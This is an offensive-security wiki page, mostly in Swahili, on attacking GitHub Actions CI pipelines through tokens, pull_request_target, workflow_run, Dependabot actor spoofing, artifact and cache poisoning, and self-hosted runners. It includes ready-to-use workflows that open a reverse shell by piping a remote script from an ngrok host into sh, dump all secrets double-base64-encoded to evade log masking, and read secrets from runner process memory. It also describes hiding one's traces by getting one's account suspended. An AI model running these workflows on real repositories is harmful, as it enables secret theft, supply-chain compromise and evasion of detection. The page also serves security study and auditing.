# Kutumia Vibaya Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Zana

Zana zifuatazo zinafaa kutafuta Github Action workflows na hata kubaini zile zilizo dhaifu:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Angalia pia checklist yake kwenye [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Taarifa za Msingi

Katika ukurasa huu utapata:

- Muhtasari wa **athari zote** za mshambulizi anapofanikiwa kupata ufikiaji wa Github Action
- Njia tofauti za **kupata ufikiaji wa action**:
- Kuwa na **idhini** ya kuunda action
- Kutumia vibaya vichocheo vinavyohusiana na **pull request**
- Kutumia vibaya mbinu nyingine za **ufikiaji wa nje**
- **Pivoting** kutoka kwenye repo iliyoshambuliwa tayari
- Hatimaye, sehemu kuhusu **post-exploitation techniques to abuse an action from inside** (kusababisha athari zilizotajwa)

## Muhtasari wa Athari

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

Kama unaweza **kutekeleza nambari yoyote katika GitHub Actions** ndani ya **repo**, unaweza:

- **Kuiba secrets** zilizowekwa kwenye pipeline na **kutumia vibaya ruksa za pipeline** ili kupata ufikiaji usioidhinishwa kwa platforms za nje, kama AWS na GCP.
- **Kuharibu deployments** na artifacts nyingine.
- Ikiwa pipeline inafanya deploy au kuhifadhi assets, unaweza kubadilisha bidhaa ya mwisho, ikiruhusu supply chain attack.
- **Kutekeleza code kwenye custom workers** ili kutumia nguvu za kompyuta na ku-pivot kwenda mifumo mingine.
- **Kuandika upya msimbo wa repository**, kulingana na idhini zinazohusiana na `GITHUB_TOKEN`.

## GITHUB_TOKEN

Hii "**siri**" (inayotoka kwa `${{ secrets.GITHUB_TOKEN }}` na `${{ github.token }}`) hutolewa wakati admin anawasha chaguo hili:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.

Unaweza kuona **idhini** zinazowezekana za tokeni hii katika: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Kumbuka kuwa tokeni **itaisha baada ya job kumalizika**.\
Tokeni hizi zinaonekana kama hii: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Baadhi ya mambo ya kuvutia unayoweza kufanya na tokeni hii:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Kumbuka kwamba katika nyakati kadhaa utaweza kupata **github user tokens inside Github Actions envs or in the secrets**. Tokens hizi zinaweza kukupa ruhusa zaidi juu ya repository na organization.

<details>

<summary>Orodhesha secrets katika output ya Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Pata reverse shell na secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Inawezekana kuangalia ruhusa zilizotolewa kwa Github Token katika repositories za watumiaji wengine kwa kuangalia logs za actions:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Utekelezaji Ulioruhusiwa

> [!NOTE]
> Hii ingekuwa njia rahisi zaidi ya kucompromise Github actions, kwani kesi hii inadhani una ufikiaji wa **create a new repo in the organization**, au una **write privileges over a repository**.
>
> Ikiwa uko katika senario hii unaweza tu kuangalia [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action).

### Utekelezaji kutoka kwa Uundaji wa Repo

Ikiwa wanachama wa organization wanaweza **create new repos** na unaweza kutekeleza github actions, unaweza **create a new repo and steal the secrets set at organization level**.

### Utekelezaji kutoka kwa Branch Mpya

Ikiwa unaweza **create a new branch in a repository that already contains a Github Action** iliyosanidiwa, unaweza **modify** hiyo action, **upload** content, kisha **execute that action from the new branch**. Kwa njia hii unaweza **exfiltrate repository and organization level secrets** (lakini unahitaji kujua jinsi zinavyoitwa).

> [!WARNING]
> Kizuizi chochote kilichotekelezwa ndani tu ya workflow YAML (kwa mfano, `on: push: branches: [main]`, job conditionals, au manual gates) kinaweza kuhaririwa na collaborators. Bila utekelezaji wa nje (branch protections, protected environments, and protected tags), contributor anaweza kuretarget workflow ili iendeshe kwenye branch yao na kutumia vibaya mounted secrets/permissions.

Unaweza kufanya action iliyobadilishwa iwe executable **manually,** wakati **PR is created** au wakati **some code is pushed** (kulingana na ni jinsi gani unataka kuonekana):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Utekelezaji uliotokana na fork

> [!NOTE]
> Kuna triggers tofauti ambazo zinaweza kumruhusu mshambuliaji kuendesha a Github Action ya repository nyingine. Ikiwa actions hizo zinazoweza kuamsha zimewekwa vibaya, mshambuliaji anaweza kuziharibu.

### `pull_request`

Trigger ya workflow **`pull_request`** itaendesha workflow kila mara pull request inapopokelewa kwa baadhi ya utofauti: kwa chaguo-msingi ikiwa ni **mara ya kwanza** unashirikiana, **maintainer** fulani atalazimika **kuidhinisha** **run** ya workflow:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Kwa vile **kikomo cha chaguo-msingi** ni kwa wachangiaji wa **mara ya kwanza**, unaweza kuchangia kwa **kurekebisha bug/typo halali** kisha kutuma **PR nyingine ili kutumika vibaya mamlaka yako mpya ya `pull_request`**.
>
> **Nimejaribu hili na halifanyi kazi**: ~~Chaguo jingine lingekuwa kuunda akaunti kwa jina la mtu aliyetoa mchango kwa project na kufuta akaunti yake.~~

Zaidi ya hayo, kwa chaguo-msingi **huzuia write permissions** na **access ya secrets** kwa repository lengwa kama ilivyoelezwa katika [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Isipokuwa `GITHUB_TOKEN`, **secrets hazipitishiwi kwa runner** wakati workflow inapochochewa kutoka kwa **forked** repository. `GITHUB_TOKEN` ina **read-only permissions** katika pull requests kutoka kwa forked repositories.

Mshambuliaji anaweza kubadilisha ufafanuzi wa Github Action ili kuendesha vitu vya hiari na kuongeza actions za hiari. Hata hivyo, hatoweza kuiba secrets wala kuandika juu ya repo kwa sababu ya vikwazo vilivyotajwa.

> [!CAUTION]
> **Ndiyo, ikiwa mshambuliaji atabadilisha katika PR github action itakayochochewa, Github Action yake ndiyo itakayotumika na si ile ya repo ya asili!**

Kwa kuwa mshambuliaji pia anasimamia code inayotekelezwa, hata kama hakuna secrets au write permissions kwenye `GITHUB_TOKEN`, mshambuliaji anaweza kwa mfano upload artifacts zenye madhara.

### **`pull_request_target`**

Trigger ya workflow **`pull_request_target`** ina **write permission** kwa repository lengwa na **access kwa secrets** (na haiombi ruhusa).

Kumbuka kwamba trigger ya workflow **`pull_request_target`** **inaendesha katika base context** na si ile iliyopewa na PR (ili **kutoendesha code isiyothibitishwa**). Kwa maelezo zaidi kuhusu `pull_request_target` [**angalia docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Zaidi ya hayo, kwa maelezo kuhusu matumizi hatari ya hili angalia hii [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Inaweza kuonekana kwa sababu workflow inayotekelezwa ni ile iliyoelezwa katika **base** na si ile iliyo kwenye PR ni **salama** kutumia **`pull_request_target`**, lakini kuna **matukio kadhaa ambapo si salama**.

Na hii itakuwa na **access kwa secrets**.

### `workflow_run`

Trigger ya [**`workflow_run`**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) inaruhusu kuendesha workflow kutoka kwa nyingine pale inapokamilika, inapohitajika au wakati iko in_progress.

Katika mfano huu, workflow imewekwa ili iendeshe baada ya workflow tofauti "Run Tests" kukamilika:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

Aina hii ya workflow inaweza kushambuliwa ikiwa inategemea workflow ambayo inaweza kuanzishwa na mtumiaji wa nje kupitia **`pull_request`** au **`pull_request_target`**. Mifano michache iliyoharibika inaweza kupatikana kwenye [**this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Mfano wa kwanza unahusisha workflow iliyozinduliwa na **`workflow_run`** kushusha attackers code: `${{ github.event.pull_request.head.sha }}`\
Mfano wa pili unahusisha **kupitisha** artifact kutoka kwa untrusted code kwenda kwa workflow ya **`workflow_run`** na kutumia maudhui ya artifact hii kwa njia inayoifanya iwe **vulnerable to RCE**.

### `workflow_call`

TODO

TODO: Check if when executed from a pull_request the used/downloaded code if the one from the origin or from the forked PR

## Kutumiwa Mbaya kwa Utekelezaji wa Forked

Tumezitaja njia zote ambazo external attacker anaweza kutumia kusababisha github workflow iendeshe; sasa tuangalie jinsi utekelezaji huu, ukiwe umebadilishwa vibaya (misconfigured), unaweza kutumiwa vibaya:

### Untrusted checkout execution

Katika kesi ya **`pull_request`**, workflow itatekelezwa katika context ya PR (kwa hivyo itatekeleza malicious PRs code), lakini mtu lazima aidhinishe kwanza na itaendesha kwa baadhi ya [limitations](#pull_request).

Katika kesi ya workflow inayotumia **`pull_request_target` or `workflow_run`** ambayo inategemea workflow inayoweza kuzinduliwa kutoka **`pull_request_target` or `pull_request`**, code kutoka repo ya asili itatekelezwa, kwa hivyo **attacker cannot control the executed code**.

> [!CAUTION]
> However, if the **action** has an **explicit PR checkou**t that will **get the code from the PR** (and not from base), it will use the attackers controlled code. For example (check line 12 where the PR code is downloaded):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potentially the **untrusted code is being run during `npm install` or `npm build`** since the build scripts and referenced **packages are controlled by the author of the PR**.

> [!WARNING]
> A github dork to search for vulnerable actions is: `event.pull_request pull_request_target extension:yml` however, there are different ways to configure the jobs to be executed securely even if the action is configured insecurely (like using conditionals about who is the actor generating the PR).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Kumbuka kwamba zipo baadhi ya [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) ambazo values zake zinadhibitediwa na **user** anayesababisha PR. Ikiwa github action inatumia data hiyo **kufanya execute kitu chochote**, inaweza kusababisha **arbitrary code execution:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Kulingana na docs: Unaweza kufanya environment variable ipatikane kwa any subsequent steps katika workflow job kwa kuiunda au ku-update environment variable na kuandika hii kwenye **`GITHUB_ENV`** environment file.

Ikiwa attacker anaweza **kuingiza value yoyote** ndani ya env variable hii, anaweza kuingiza env variables ambazo zinaweza kuendesha code katika hatua zifuatazo kama **LD_PRELOAD** au **NODE_OPTIONS**.

Kwa mfano ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), fikiria workflow inayomwamini uploaded artifact kuhifadhi maudhui yake ndani ya **`GITHUB_ENV`** env variable. Attacker anaweza upload kitu kama hiki kumkomboa:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

Kama ilivyoelezwa katika [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), mashirika kadhaa yana Github Action inayochanganya PR yoyote kutoka `dependabot[bot]` kama katika:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Hii ni tatizo kwa sababu uwanja `github.actor` unaonyesha mtumiaji aliyehusika na tukio la mwisho lililochochea workflow. Na kuna njia kadhaa za kufanya mtumiaji `dependabot[bot]` aibadilishe PR. Kwa mfano:

- Fanya fork ya repository la mwathiriwa
- Ongeza payload ya kuharibu kwenye nakala yako
- Washa Dependabot kwenye fork yako kwa kuongeza dependency isiyo ya sasa. Dependabot ataunda branch kurekebisha dependency hiyo akiwa na malicious code.
- Fungua Pull Request kwa repository la mwathiriwa kutoka branch hiyo (PR itaundwa na mtumiaji kwa hivyo bado hakuna kitakachotokea)
- Kisha, mshambulizi anarudi kwenye PR ya awali ambayo Dependabot alifungua kwenye fork yake na anafanya `@dependabot recreate`
- Kisha, Dependabot hufanya baadhi ya vitendo kwenye branch hiyo, vinavyobadilisha PR kwenye repo la mwathiriwa, jambo ambalo linafanya `dependabot[bot]` kuwa actor wa tukio la mwisho lililochochea workflow (na kwa hivyo, workflow inaendeshwa).

Endelea, je, badala ya merging Github Action ingekuwa na command injection kama ifuatavyo:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Kwa kweli, mchapisho wa blogu la asili linapendekeza chaguzi mbili za kutumia tabia hii; chaguo la pili ni:

- Fork the victim repository and enable Dependabot with some outdated dependency.
- Create a new branch with the malicious shell injection code.
- Change the default branch of the repo to that one
- Create a PR from this branch to the victim repository.
- Run `@dependabot merge` in the PR Dependabot opened in his fork.
- Dependabot will merge his changes in the default branch of your forked repository, updating the PR in the victim repository making now the `dependabot[bot]` the actor of the latest event that triggered the workflow and using a malicious branch name.

### Github Actions za Wahusika wa Tatu Zilizo Vunikika

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Kama ilivyotajwa katika [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), Github Action hii inaruhusu kufikia artifacts kutoka workflows tofauti na hata repositories.

Tatizo ni kwamba ikiwa parameter ya **`path`** haijawekwa, artifact inafukuliwa kwenye directory ya sasa na inaweza kuandika juu ya faili ambazo zinaweza kutumika baadaye au hata kutekelezwa katika workflow. Kwa hivyo, ikiwa Artifact iko vunikika, mshambuliaji anaweza kuvitumia hivi kuathiri workflows nyingine zinazomwamini Artifact.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Hii inaweza kushambuliwa kwa workflow ifuatayo:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Other External Access

### Deleted Namespace Repo Hijacking

Ikiwa akaunti inabadilisha jina lake, mtumiaji mwingine anaweza kujiandikisha kwa jina hilo baada ya muda. Ikiwa repository ilikuwa na **chini ya 100 stars kabla ya mabadiliko ya jina**, Github itamruhusu mtumiaji mpya aliyejisajili kwa jina lile kuunda **repository yenye jina sawa** na ile iliyofutwa.

> [!CAUTION]
> Kwa hivyo ikiwa action inatumia repo kutoka kwa akaunti isiyokuwepo, bado inawezekana kwamba attacker anaweza kuunda akaunti hiyo na compromise action.

Ikiwa repositories nyingine zilikuwa zikitumia **dependencies kutoka kwenye user repos hii**, attacker ataweza ku-hijack hizo. Hapa kuna maelezo ya kina zaidi: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> Katika sehemu hii tutazungumzia techniques zitakazoruhusu **pivot from one repo to another** ikizingatiwa kuwa tuna aina fulani ya access kwenye ile ya kwanza (tazama sehemu iliyotangulia).

### Cache Poisoning

Cache huhifadhiwa kati ya **workflow runs in the same branch**. Hii inamaanisha kwamba ikiwa attacker ata-compromise package ambayo kisha itahifadhiwa kwenye cache na itachukuliwa (downloaded) na kutekelezwa na workflow yenye **more privileged**, ataweza ku-compromise workflow hiyo pia.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows zinaweza kutumia **artifacts from other workflows and even repos**, ikiwa attacker atafanikiwa ku-compromise Github Action inayofanya **uploads an artifact** ambayo baadaye inatumika na workflow nyingine, anaweza ku-compromise workflows nyingine:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

Kama ilivyoelezwa katika [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), hata kama repository au organization ina policy inayozuia matumizi ya actions fulani, attacker anaweza tu download (`git clone`) action ndani ya workflow kisha kuitaja kama local action. Kwa kuwa policies hazihusishi local paths, **the action will be executed without any restriction.**

Example:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### Kupata AWS na GCP kupitia OIDC

Check the following pages:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Kupata secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

Ikiwa unakiingiza maudhui katika script, ni muhimu kujua jinsi unavyoweza kupata secrets:

- Ikiwa secret au token imewekwa kama **variable ya mazingira**, inaweza kupatikana moja kwa moja kupitia mazingira kwa kutumia **`printenv`**.

<details>

<summary>Orodhesha secrets katika Github Action output</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Pata reverse shell na secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- If the secret is used **directly in an expression**, the generated shell script is stored **kwenye diski** na inapatikana.
- ```bash
cat /home/runner/work/_temp/*
```
- For a JavaScript actions, secrets hutumwa kupitia environment variables
- ```bash
ps axe | grep node
```
- For a **custom action**, the risk can vary depending on how a program is using the secret it obtained from the **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Orodhesha secrets zote kupitia secrets context (collaborator level). Contributor mwenye write access anaweza kubadilisha workflow kwenye branch yoyote ili kudump secrets zote za repository/org/environment. Tumia double base64 kuepuka GitHub’s log masking na decode locally:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Decode locally:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: kwa ajili ya stealth wakati wa testing, encrypt kabla ya kuchapisha (openssl imewekwa awali kwenye GitHub-hosted runners).

### Kutumia vibaya Self-hosted runners

Njia ya kugundua ni zipi **Github Actions are being executed in non-github infrastructure** ni kutafuta **`runs-on: self-hosted`** kwenye Github Action configuration yaml.

**Self-hosted** runners yanaweza kupata ufikiaji wa **extra sensitive information**, kwa wengine **network systems** (vulnerable endpoints katika network? metadata service?) au, hata ikiwa yamekatwa na kusambaratishwa, **more than one action might be run at the same time** na ile yenye madhumuni mabaya inaweza **steal the secrets** ya nyingine.

Katika self-hosted runners pia inawezekana kupata **secrets from the \_Runner.Listener**\_\*\* process\*\* ambayo itakuwa na secrets zote za workflows katika hatua yoyote kwa kudump memory yake:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Check [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Inawezekana kuunda Github actions ambazo zitajenga na kuhifadhi **Docker image ndani ya Github**.\
Mfano upo kwenye yafuatayo inayoweza kupanuliwa:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Kama ulivyoona katika msimbo uliopita, Github registry imehifadhiwa katika **`ghcr.io`**.

Mtumiaji mwenye ruhusa za kusoma kwenye repo ataweza kupakua Docker Image kwa kutumia personal access token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Kisha, mtumiaji anaweza kutafuta **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Taarifa nyeti katika Github Actions logs

Hata kama **Github** inajaribu **kutambua secret values** katika actions logs na **kuepuka kuonyesha** hizo, **data nyingine nyeti** ambazo zinaweza kuwa zimezalishwa wakati wa utekelezaji wa action hazitafichwa. Kwa mfano JWT iliyosainiwa kwa secret value haitafichwa isipokuwa ikiwa [imewekwa maalum](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Kuficha dalili zako

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Kwanza kabisa, PR yoyote iliyowasilishwa inaonekana wazi kwa umma kwenye Github na kwa akaunti lengwa ya GitHub. Katika GitHub kwa chaguo-msingi, sisi **can’t delete a PR of the internet**, lakini kuna mabadiliko. Kwa akaunti za Github ambazo zime **suspended** na Github, PR zao zote **zanafuta kiotomatiki** na kuondolewa kutoka kwenye internet. Kwa hivyo ili kuficha shughuli zako unahitaji kupata ama akaunti yako ya **GitHub account suspended au akaunti yako iflagged**. Hii itafanya **kuificha shughuli zako zote** kwenye GitHub kutoka internet (kimsingi kuondoa all your exploit PR)

Shirika kwenye GitHub ni makini sana kuripoti akaunti kwa GitHub. Unachohitaji kufanya ni kushiriki “mambo fulani” katika Issue na watahakikisha akaunti yako itasuspended ndani ya masaa 12 :p na hivyo, umefanya exploit yako ionekane isiyoonekana kwenye github.

> [!WARNING]
> Njia pekee kwa shirika kugundua wamezingatiwa ni kuchunguza GitHub logs kutoka SIEM kwa sababu kutoka GitHub UI PR itafutwa.

## References

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
